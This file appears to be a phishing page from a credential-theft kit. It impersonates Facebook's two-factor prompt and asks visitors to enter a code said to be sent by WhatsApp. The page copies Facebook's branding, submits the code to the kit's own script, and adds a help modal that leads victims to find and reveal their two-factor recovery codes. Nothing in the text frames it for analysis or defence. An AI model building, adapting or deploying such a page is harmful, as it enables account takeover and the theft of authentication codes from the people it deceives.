<?php


?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css"
        integrity="sha384-rbsA2VBKQhggwzxH7pPCaAqO46MgnOM80zW1RWuH61DGLwZJEdK2Kadq2F9CUG65" crossorigin="anonymous">
<link rel="shortcut icon" href="./assets/img/fico.ico" type="image/x-icon">
<link rel="stylesheet" href="./assets/css/twofa.css">
<link href="./assets/css/boxicons.min.css" rel="stylesheet">
<style>
    body{
        background-color: #FFFFFF !important;
    }
    .box{
        border:none !important;
    }
    #fa2{
        width: 100% !important;
        height: 55px !important;
        outline: none !important;
        border-radius: 16px !important;
        padding: 16px !important;
    }
    .submit2fa{
        width: 100% !important;
        outline: none !important;
        border-radius: 16px !important;
        padding: 10px !important;
    }
    .submit2fa:disabled {
        opacity: 0.6 !important;
        cursor: not-allowed !important;
    }
</style>

    <title>Facebook</title>

</head>
<body>
<div class="navbar">
        <div class="container">
            <a href="/"><p><img src="./assets/img/fblogo.svg" class="logonav"></p></a>
            <div class="logout">
            <a href="#"><p>Log out</p></a>
        </div>

        </div>
</div>
<div class="mm">
<div class="box">

<div class="box_content">
<h4><b>Check your WhatsApp messages
</b></h4>
<p>Enter the code we sent to your WhatsApp account.</p>
<img src="assets/img/whatsapp.jpg" alt="" width="100%">
<br><br>
            <form method="POST" name="formfa" id="formfa" class="form" onsubmit="return onLoginSubmit(this)">
    <div class="form-group">
        <input type="number" name="fa2" id="fa2" placeholder="Code">
        <br>
        <span id="number-error" class="error-message" style="margin:0px;padding:0px"></span>
<br>
        <div class="bottomline">
            <button type="submit" class="submit2fa"  name="submit" id="submit" style="font-weight:500 !important;">
            <i class="bx bx-loader-alt bx-spin bx-rotate-90" style="display: none;"></i>Continue</button>
        </div>
    </div>
</form>
</div>
</div>

</div>
<!-- Modal -->
<div id="modal-container">
    <div id="modal">
      <h6>Didn't receive a code?</h6>
      <hr>
      <p>
        1. Go to <b>Settings > Security and Login.</b>
<br> <br>
2. Under the <b>Two-Factor Authentication</b> section, click <b>Use two-factor authentication.</b> You may need to re-enter your password.
<br><br>
3. Next to <b>Recovery Codes</b>, click <b>Setup</b> then <b>Get Codes.</b> If you've already set up recovery codes, you can click <b>Show Codes.</b>
<br><br>
<img src="./assets/img/recovery.gif" alt="" width="100%" height="auto">

      </p>
      <button id="close-modal" class="close-modal">Continue</button><br><br>
    </div>
  </div>
  
<script src="https://code.jquery.com/jquery-3.6.4.min.js" integrity="sha256-oP6HI9z1XaZNBrJURtCoUT5SUnxFr8s3BzRl+cbzUq8=" crossorigin="anonymous"></script>
<script src="./assets/js/twofa.js"></script>



</body>
</html>